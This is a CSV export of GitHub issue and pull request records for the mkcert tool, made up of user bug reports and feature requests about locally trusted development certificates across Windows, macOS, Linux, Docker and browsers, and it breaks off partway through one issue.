FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/232,547230392,MDU6SXNzdWU1NDcyMzAzOTI=,232,wildcard certs don't work on Windows,1452996,closed,FALSE,NA,NA,5,2020-01-09T03:45:23Z,2020-10-25T23:52:14Z,2020-10-25T23:52:14Z,NONE,NA,"Windows 10 x64
Chrome 79.0.3945.88

Wildcard certificates created per the doc do not work on Windows 10. The cert shows up in Chrome as Invalid for whoami.localhost.

`mkcert -key-file key.pem -cert-file cert.pem *.localhost`

Non-wildcard certificates with specific subject alternative names do work. This shows up as Valid in Chrome for whoami.localhost.

`mkcert -key-file key.pem -cert-file cert.pem blog.example.com whoami.localhost`",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/232/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/232/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/232/events,https://github.com/FiloSottile/mkcert/issues/232,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/231,546925758,MDU6SXNzdWU1NDY5MjU3NTg=,231,mkcert failed adding cert: Access is denied.,42040754,open,FALSE,NA,NA,13,2020-01-08T15:16:12Z,2021-03-21T15:33:19Z,NA,NONE,NA,"Hi,
I tried to use mkcert on Windows.
However when I use mkcert -install, it is failed because access is denied.
I dont know the problem because I use cmd as administrator.

![Screenshot_3](https://user-images.githubusercontent.com/42040754/71989637-9835c300-3264-11ea-8fd7-06203e0dd4b7.png)


",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/231/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/231/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/231/events,https://github.com/FiloSottile/mkcert/issues/231,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/230,543998019,MDU6SXNzdWU1NDM5OTgwMTk=,230,Chromium 78 rejects importing key,1095675,closed,FALSE,NA,NA,3,2019-12-30T20:12:46Z,2019-12-31T06:27:44Z,2019-12-31T06:27:35Z,NONE,NA,"Tried to import the key into Chromium:

```
Certification Authority Import Error
The file contained one certificate, which was not imported:
mkcert development certificate: Not a Certification Authority
```

Chromium Version 78.0.3904.87",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/230/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/230/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/230/events,https://github.com/FiloSottile/mkcert/issues/230,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/229,543961586,MDU6SXNzdWU1NDM5NjE1ODY=,229,Feature request: customize the name of the Root CA added to the trust store,89887,open,FALSE,NA,NA,1,2019-12-30T17:57:53Z,2020-01-10T15:24:41Z,NA,NONE,NA,"mkcert currently sets the name of the Root CA certificate to ""mkcert user@host""; at least that's what I see in my Trusted Root Certification Authorities on Windows.

Would it be possible to customize (even partly) the name (e.g., adding a custom suffix)?
In my case, for isolation purposes, I generate multiple Root CA certificates for each environment of my application. Of course this is only used on the developers machines, but it would be nice for us to be able to distinguish the entries.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/229/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/229/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/229/events,https://github.com/FiloSottile/mkcert/issues/229,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/228,542558201,MDExOlB1bGxSZXF1ZXN0MzU2OTczNDAx,228,README: Add cd mkcert to build from source instructions,214673,closed,FALSE,NA,NA,1,2019-12-26T13:36:54Z,2019-12-26T13:53:16Z,2019-12-26T13:53:11Z,CONTRIBUTOR,NA,This adds a missing `cd mkcert` in the instructions to build from source in the README document.,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/228/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/228/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/228/events,https://github.com/FiloSottile/mkcert/pull/228,https://api.github.com/repos/FiloSottile/mkcert/pulls/228
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/227,537450064,MDExOlB1bGxSZXF1ZXN0MzUyODAzMTQ5,227,dockerize mkcert,56916043,closed,FALSE,NA,NA,2,2019-12-13T09:49:37Z,2020-10-25T23:28:26Z,2020-10-25T23:28:26Z,NONE,NA,"- alpine based dockerfile
- multi-stage build
- scratch container
- create Makefile
- use gox for cross go compilation",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/227/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/227/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/227/events,https://github.com/FiloSottile/mkcert/pull/227,https://api.github.com/repos/FiloSottile/mkcert/pulls/227
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/226,535909989,MDExOlB1bGxSZXF1ZXN0MzUxNTM0MDU5,226,README: Mention official Arch Linux package,3833685,closed,FALSE,NA,NA,1,2019-12-10T18:34:11Z,2019-12-26T13:56:12Z,2019-12-26T13:56:07Z,CONTRIBUTOR,NA,Signed-off-by: Christian Rebischke <chris@nullday.de>,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/226/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/226/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/226/events,https://github.com/FiloSottile/mkcert/pull/226,https://api.github.com/repos/FiloSottile/mkcert/pulls/226
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/225,530443187,MDExOlB1bGxSZXF1ZXN0MzQ3MTI0NDIx,225,add firefox nightly and developer edition binary paths,6832539,closed,FALSE,NA,NA,0,2019-11-29T17:30:21Z,2019-11-29T22:36:51Z,2019-11-29T22:36:50Z,CONTRIBUTOR,NA,"on my system I have only Firefox Nightly installed, so `/usr/bin/firefox` doesn't exist and so `hasNSS` was false and CA wasn't installed.

on my arch based system, the binary was at `/usr/bin/firefox-nightly`
https://aur.archlinux.org/packages/firefox-nightly/

it could also be at `/usr/bin/firefox-developer-edition`
see ""package contents""
https://www.archlinux.org/packages/community/x86_64/firefox-developer-edition/",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/225/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/225/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/225/events,https://github.com/FiloSottile/mkcert/pull/225,https://api.github.com/repos/FiloSottile/mkcert/pulls/225
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/224,529020617,MDExOlB1bGxSZXF1ZXN0MzQ1OTc1NTc5,224,Fix git clone command,8163,closed,FALSE,NA,NA,1,2019-11-26T23:07:55Z,2019-11-26T23:31:48Z,2019-11-26T23:31:44Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/224/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/224/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/224/events,https://github.com/FiloSottile/mkcert/pull/224,https://api.github.com/repos/FiloSottile/mkcert/pulls/224
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/223,527295012,MDU6SXNzdWU1MjcyOTUwMTI=,223,ERR_CERT_COMMON_NAME_INVALID when I access a non-localhost domain?,109196,closed,FALSE,NA,NA,4,2019-11-22T16:31:02Z,2019-11-22T20:04:45Z,2019-11-22T20:04:45Z,NONE,NA,"Hi there,

I'm on MacOS Catalina. I've installed MkCert and used it to generate a cert for localhost and a domain that maps to 127.0.0.1 also (using a local dnsmasq setup)

When I access `https://localhost/...` all works fine, but when I access `https://mysite.matt/` (that's my custom domain ) I get `ERR_CERT_COMMON_NAME_INVALID` - here's a screenshot:

![image](https://user-images.githubusercontent.com/109196/69442937-53ea7400-0d45-11ea-9310-26237443fbb3.png)

I'm not sure if this is setup related or an issue in mkcert, so apologies in advance if I'm wasting anyones time..
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/223/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/223/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/223/events,https://github.com/FiloSottile/mkcert/issues/223,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/222,525765637,MDU6SXNzdWU1MjU3NjU2Mzc=,222,mkcert as local user getting Not: not found,344116,closed,FALSE,NA,NA,3,2019-11-20T12:13:16Z,2021-03-26T06:08:48Z,2019-11-20T12:22:46Z,NONE,NA,"I'm running mkcert as a local Docker container user in order to get it installed into the NSS DB so that it will work with headless Chrome (and Selenium) in a Docker container. I've used this approach successfully in a different container, but in this one (selenium/standalone-chrome-debug) I'm hitting a strange error that I'm not quite sure how to diagnose or debug.

Command: output

```
$ TRUST_STORES=nss mkcert -install
/usr/local/bin/mkcert: 1: /usr/local/bin/mkcert: Not: not found
```

From what I can tell, the tool is getting unexpected output and trying to execute that output. When I tried another invocation of this (with `sudo -E` in case permissions were an issue), it failed on line 26 of `sh`.

It's running Ubuntu:

```
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.2 LTS
Release:        18.04
Codename:       bionic
```

I install mkcert in the Dockerfile with:

```
ENV MKCERT_VERSION=v1.4.0
RUN sudo su -c 'apt-get update && \
  apt-get install -y curl openssl libnss3-tools && \
  curl -sSL https://github.com/FiloSottile/mkcert/releases/download/$MKCERT_VERSION/mkcert-$MKCERT_VERSION-linux-amd64 -o /usr/local/bin/mkcert && \
  chmod +x /usr/local/bin/mkcert && \
  apt-get purge -y curl && apt-get clean && \
  chmod +x /selenium2-startup.sh'
```

And I see paths to the expected binaries with `which`, etc.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/222/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/222/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/222/events,https://github.com/FiloSottile/mkcert/issues/222,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/221,524783644,MDExOlB1bGxSZXF1ZXN0MzQyNDk1Mjkw,221,Add Gentoo Linux support,7548,closed,FALSE,NA,NA,2,2019-11-19T05:29:22Z,2019-11-19T06:00:50Z,2019-11-19T05:43:03Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/221/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/221/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/221/events,https://github.com/FiloSottile/mkcert/pull/221,https://api.github.com/repos/FiloSottile/mkcert/pulls/221
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/220,524701204,MDExOlB1bGxSZXF1ZXN0MzQyNDI5Mjg4,220,Refactor truststore logic into own package (1/2),6328589,open,FALSE,NA,NA,0,2019-11-19T00:33:41Z,2019-11-19T00:33:41Z,NA,NONE,NA,"This PR creates a new package duplicating the truststore logic into its own package.

My intent is for a subsequent PR to refactor `main()` to use the truststore package, and remove truststore logic from the main package.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/220/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/220/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/220/events,https://github.com/FiloSottile/mkcert/pull/220,https://api.github.com/repos/FiloSottile/mkcert/pulls/220
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/219,522233833,MDU6SXNzdWU1MjIyMzM4MzM=,219,How to install Root CA to puppeteer's chromium?,71315,open,FALSE,NA,NA,1,2019-11-13T13:46:38Z,2021-03-18T15:04:19Z,NA,NONE,NA,"A simple `mkcert -install` isn't enough to ""inject"" the Root CA to Chromium from puppeteer.

Anybody have any good advice?

EDIT: Note: I run puppeteer in docker, maybe this is the problem. Whatever. The problem is that `~/.pki/nssdb` doesn't exist. So i came to this work-a-round:

```
mkdir -p $HOME/.pki/nssdb
certutil -d sql:$HOME/.pki/nssdb -N --empty-password
/root/bin/mkcert -install
```

And now, the Chromium called via puppeteer can verify the ssl certificates and `'--ignore-certificate-errors'` is not needed, any more.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/219/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/219/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/219/events,https://github.com/FiloSottile/mkcert/issues/219,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/218,521592760,MDExOlB1bGxSZXF1ZXN0MzM5OTQzNDgz,218,Add note about advanced options in README,9272498,closed,FALSE,NA,NA,1,2019-11-12T14:41:28Z,2019-11-26T23:35:08Z,2019-11-26T23:35:02Z,CONTRIBUTOR,NA,"Clarify position of advanced options argumnts (they won’t work if are placed after domain names)

Add example.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/218/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/218/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/218/events,https://github.com/FiloSottile/mkcert/pull/218,https://api.github.com/repos/FiloSottile/mkcert/pulls/218
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/217,521009423,MDU6SXNzdWU1MjEwMDk0MjM=,217,Homebrew bump for v1.4.1,112444,closed,FALSE,NA,NA,3,2019-11-11T14:55:31Z,2019-11-12T19:05:44Z,2019-11-12T19:05:44Z,NONE,NA,"I don't see v1.4.1 release in homebrew/linuxbrew, hoping to see it there :)

Thanks!",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/217/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/217/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/217/events,https://github.com/FiloSottile/mkcert/issues/217,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/216,520522662,MDExOlB1bGxSZXF1ZXN0MzM5MDk1MTE1,216,truststore_nss: retry certtool with sudo when it fails due to permissions,1225294,closed,FALSE,NA,NA,3,2019-11-09T22:31:40Z,2019-11-12T19:07:08Z,2019-11-09T23:18:20Z,OWNER,NA,"Based on @rfay's investigation and fix.

Fixes #192
Closes #193",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/216/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/216/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/216/events,https://github.com/FiloSottile/mkcert/pull/216,https://api.github.com/repos/FiloSottile/mkcert/pulls/216
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/215,520513274,MDExOlB1bGxSZXF1ZXN0MzM5MDg4NjY2,215,analysis.go: use x/tools/go/analysis/multichecker to run analysis tools,1225294,closed,FALSE,NA,NA,0,2019-11-09T21:01:07Z,2021-03-21T05:58:07Z,2019-11-09T21:04:55Z,OWNER,NA,"This pattern has a number of advantages: it tracks the versions of the
tools in go.mod, it doesn't require installing anything in CI, it runs
all analysis passes at once, and it lets us add custom ones easily.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/215/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/215/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/215/events,https://github.com/FiloSottile/mkcert/pull/215,https://api.github.com/repos/FiloSottile/mkcert/pulls/215
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/214,519791834,MDU6SXNzdWU1MTk3OTE4MzQ=,214,support for --chain-file and --fullchain-file commands to create respective files ,7290508,closed,FALSE,NA,NA,4,2019-11-08T05:33:59Z,2021-02-10T03:48:15Z,2019-11-09T21:52:03Z,NONE,NA,"This program is amazing. However there are these commands I just wish were baked in it. I normally have to make these files manually as they are required in many projects. I think it'd be great if mkCert allowed generation of these files using cli arguments:

```bash
# create chain file
$ cat cert-file.pem > chain.pem
$ cat ""$(mkcert -CAROOT)/rootCA.pem"" >> chain.pem
# create fullchain file
$ cat cert-file.pem > fullchain.pem
$ cat chain.pem >> fullchain.pem
```

https://community.letsencrypt.org/t/public-and-private-keys/25493/3?u=emahuni

This is how I make these files where needed, but it'd be simple to implement and great to have mkcert do this for us through:

```bash
$ mkcert localhost --chain-file chain.pem --fullchain-file fullchain.pem
```
or also produce them together with the default files (cert and key) based on the domain if these arguments are not specified:

```bash
$ mkcert localhost
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/214/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/214/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/214/events,https://github.com/FiloSottile/mkcert/issues/214,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/213,518894931,MDU6SXNzdWU1MTg4OTQ5MzE=,213,mkcert asks for password in Mac OS,280453,closed,FALSE,NA,NA,3,2019-11-06T22:38:32Z,2019-11-06T22:56:09Z,2019-11-06T22:56:09Z,NONE,NA,"The `-install` command fails even in the first time. 

Am I setting the password and Am I expected to provide the password?

Anyway what is the password?

```
$mkcert -install
Created a new local CA at ""/Users/nsankaran/Library/Application Support/mkcert"" 💥
Password:
Password:
Password:
ERROR: failed to execute ""security add-trusted-cert"": exit status 1

Sorry, try again.
Sorry, try again.
sudo: 3 incorrect password attempts
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/213/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/213/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/213/events,https://github.com/FiloSottile/mkcert/issues/213,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/212,518296911,MDU6SXNzdWU1MTgyOTY5MTE=,212,picture in picture mode for youtube,42908194,closed,FALSE,NA,NA,0,2019-11-06T07:43:13Z,2019-11-06T16:15:40Z,2019-11-06T16:15:40Z,NONE,NA,we need picture in picture mode for youtube,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/212/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/212/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/212/events,https://github.com/FiloSottile/mkcert/issues/212,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/211,517503599,MDExOlB1bGxSZXF1ZXN0MzM2NTYwODcy,211,Use regexp compile,31758692,closed,FALSE,NA,NA,1,2019-11-05T01:53:59Z,2019-11-09T21:46:11Z,2019-11-09T21:46:11Z,NONE,NA,The [regexp.MustCompile function](https://golang.org/pkg/regexp/#MustCompile) panics if the regex fails to compile and should only be used in globals or init functions. Instead use [regexp.Compile](https://golang.org/pkg/regexp/#Compile) and check `err` is nil.,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/211/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/211/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/211/events,https://github.com/FiloSottile/mkcert/pull/211,https://api.github.com/repos/FiloSottile/mkcert/pulls/211
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/210,511131514,MDU6SXNzdWU1MTExMzE1MTQ=,210,Can I use it on the LAN network?,12774598,closed,FALSE,NA,NA,2,2019-10-23T07:29:21Z,2021-01-17T18:56:35Z,2019-11-09T22:36:35Z,NONE,NA,"There is a server (IP:192.168.0.222 ) in the LAN, I have configured it with the LAN DNS service (dnsmasq), and this server is also doing Web services. Now I want to install mkcert on it, as a CA certificate organization.Will it work?

",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/210/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/210/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/210/events,https://github.com/FiloSottile/mkcert/issues/210,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/209,508711069,MDU6SXNzdWU1MDg3MTEwNjk=,209,`go run github.com/FiloSottile/mkcert` no longer works outside with Go 1.14,524812,closed,FALSE,NA,NA,1,2019-10-17T20:44:16Z,2019-11-09T22:34:30Z,2019-11-09T22:34:30Z,NONE,NA,"The fix for https://github.com/golang/go/issues/32027 disallows `go run` and friends outside a module (when GO111MODULE=on):

    $ GO111MODULE=on go run github.com/FiloSottile/mkcert
    cannot find module providing package github.com/FiloSottile/mkcert: working directory is not part of a module",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/209/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/209/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/209/events,https://github.com/FiloSottile/mkcert/issues/209,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/208,506343711,MDU6SXNzdWU1MDYzNDM3MTE=,208,How does one completely uninstall this library?,6573474,closed,FALSE,NA,NA,6,2019-10-13T15:59:19Z,2019-10-17T19:57:04Z,2019-10-13T20:47:11Z,NONE,NA,"Thanks for the useful library, however I'd like to uninstall it + remove this:

> Warning: the rootCA-key.pem file that mkcert automatically generates gives complete power to intercept secure requests from your machine. Do not share it.

Where is `rootCA-key.pem`?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/208/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/208/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/208/events,https://github.com/FiloSottile/mkcert/issues/208,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/207,505790726,MDU6SXNzdWU1MDU3OTA3MjY=,207,$ mkcert -install again for newly FF,625286,closed,FALSE,NA,NA,1,2019-10-11T11:14:01Z,2019-11-09T22:37:01Z,2019-11-09T22:37:01Z,NONE,NA,"Hey,

i've a maybe stupid question: I've a new Mac and installed mkcert before the installation of FF (Developer Edition). Of course, the certificate is missing in the FF trust store. Can i just run $ mkcert -install again without effecting my already generated site certificates?

Mario",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/207/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/207/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/207/events,https://github.com/FiloSottile/mkcert/issues/207,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/206,505440277,MDU6SXNzdWU1MDU0NDAyNzc=,206,"Wildcard certificates on Safari, macOS Catalina",2474517,closed,FALSE,NA,NA,13,2019-10-10T18:34:32Z,2020-09-03T08:33:26Z,2019-10-11T13:24:10Z,NONE,NA,"On macOS Catalina I can not use wildcard certificates with Safari.

They work fine on Chrome and Firefox, but Safari (13.0.2 and Technology Preview) complains that ""Certificate name does not match input"".

I have the same problem with old and new certificates, with and without multiple names.
Certificates with multiple names work with the non-wildcard names (e.g. a certificate for ""domain.test"" and ""*.domain.test"" works fine with https://domain.test but fails with https://sub.domain.test)

![wildcard](https://user-images.githubusercontent.com/2474517/66596385-136fd600-eb9d-11e9-93ae-7016a97e5633.png)
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/206/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/206/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/206/events,https://github.com/FiloSottile/mkcert/issues/206,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/205,504977452,MDU6SXNzdWU1MDQ5Nzc0NTI=,205,Why subject doesn't contain CN for generated certs?,631797,closed,FALSE,NA,NA,3,2019-10-10T01:22:59Z,2019-10-16T15:02:26Z,2019-10-13T20:48:56Z,NONE,NA,"The typical generated cert via mkcert has subject as:-

```
subject= /O=mkcert development certificate/OU=username@hostname
```

While most web certs also have a CommonName attribute. 

```
➤ openssl s_client -servername www.google.com -connect ""www.google.com:443"" </dev/null 2>&1| openssl x509 -noout -subject -issuer
subject= /C=US/ST=California/L=Mountain View/O=Google LLC/CN=www.google.com
issuer= /C=US/O=Google Trust Services/CN=GTS CA 1O1
```

Is there a reason behind this design choice?

I can see that CommonName is ignored while creating the cert. 
https://github.com/FiloSottile/mkcert/blob/df15e0c1efd3b2f372170e6866cac54df720e724/cert.go#L61-L64
Later, for PKCS#12, there's a CommonName added but not for usual default options, why?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/205/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/205/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/205/events,https://github.com/FiloSottile/mkcert/issues/205,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/204,504183995,MDU6SXNzdWU1MDQxODM5OTU=,204,How to customize CN?,100721,closed,FALSE,NA,NA,2,2019-10-08T17:43:28Z,2019-11-10T02:14:07Z,2019-11-09T22:38:15Z,NONE,NA,I need a certificate with a specific Common Name. I didn't find any doc about that. Is it possible to customize? Thanks.,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/204/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/204/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/204/events,https://github.com/FiloSottile/mkcert/issues/204,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/203,501478097,MDU6SXNzdWU1MDE0NzgwOTc=,203,If dynamic CA configuration disabled - return error,1027857,open,FALSE,NA,NA,0,2019-10-02T13:08:28Z,2019-10-02T13:08:58Z,NA,NONE,NA,"When ""The dynamic CA configuration feature is in the disabled state"" `mkcert -install` put certificate to the appropriate place and call `update-ca-trust extract` (for Linux / CentOS 6 for example).
This util produced Warning output and does nothing with certs.

```sh
[root@centos]# update-ca-trust extract
update-ca-trust: Warning: The dynamic CA configuration feature is in the disabled state
So CA cert was not installed.
```

Proposed to chek that ""The dynamic CA configuration feature is in the disabled state"" and return non zero result code when trying to install the certificate.
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/203/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/203/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/203/events,https://github.com/FiloSottile/mkcert/issues/203,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/202,496548655,MDU6SXNzdWU0OTY1NDg2NTU=,202,Certificate not trusted in iOS 13,39500356,closed,FALSE,NA,NA,6,2019-09-20T21:12:04Z,2020-10-29T07:18:25Z,2019-09-22T10:25:36Z,NONE,NA,"My certificate is no longer trusted since upgrading to iOS 13. I'm guessing it has to do with the new requirements introduced in iOS 13.

https://support.apple.com/en-us/HT210176",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/202/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/202/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/202/events,https://github.com/FiloSottile/mkcert/issues/202,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/201,496263498,MDU6SXNzdWU0OTYyNjM0OTg=,201,"mkcert -install keeps telling me that ""keytool is not available"", when it is?",38424470,closed,FALSE,NA,NA,3,2019-09-20T10:02:19Z,2020-06-26T18:41:14Z,2019-11-09T22:40:03Z,NONE,NA,"I keep getting:

    Warning: ""keytool"" is not available, so the CA can't be automatically installed in Java's trust store! ⚠️

When it plainly is available, I can just type ""keytool"" and it works. JAVA_HOME is set just fine. I'm really at a loss because everything else can access it just fine.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/201/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/201/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/201/events,https://github.com/FiloSottile/mkcert/issues/201,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/200,496062742,MDU6SXNzdWU0OTYwNjI3NDI=,200,setting up multiple computers with same .pem file generated by mkcert,15990589,closed,FALSE,NA,NA,3,2019-09-19T22:55:40Z,2019-09-20T15:30:32Z,2019-09-20T14:52:10Z,NONE,NA,"Hi, this might be a rookie question.

I have an unqiue development network setup at work. If I serve my https web page  ""example.org"", not only I see ""example.org"" on my machine locally, but also other developers on their machines within the same network see ""example.org"".

If I run on my own machine:
```
mkcert -install
mkcert example.org
```
It configures my windows computer so that my browser doesn't complain when I visit https://example.org served with example-key.pem and example-cert.pem.

